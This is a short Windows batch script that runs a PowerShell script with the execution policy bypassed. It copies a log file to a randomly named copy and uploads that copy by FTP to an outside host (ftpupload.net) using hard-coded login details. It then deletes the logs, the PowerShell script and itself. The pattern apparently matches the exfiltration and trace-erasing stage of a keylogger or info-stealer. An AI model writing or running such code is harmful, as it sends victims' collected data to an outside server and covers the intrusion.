@echo off

powershell.exe -ExecutionPolicy Bypass -File "test2.ps1"

set "random=%RANDOM%"
powershell.exe -Command "Get-Content -Path 'log1.txt' | Set-Content -Path 'log%random%.txt' -Encoding utf8"

(
    echo open ftpupload.net
    echo b31_34888145
    echo @Testftp123
    echo put log%random%.txt
    echo disconnect
    echo quit
) > ftp_commands.txt

ftp -s:ftp_commands.txt
del ftp_commands.txt
del log1.txt
del log%random%.txt
del test2.ps1
del %0

echo Selesai.
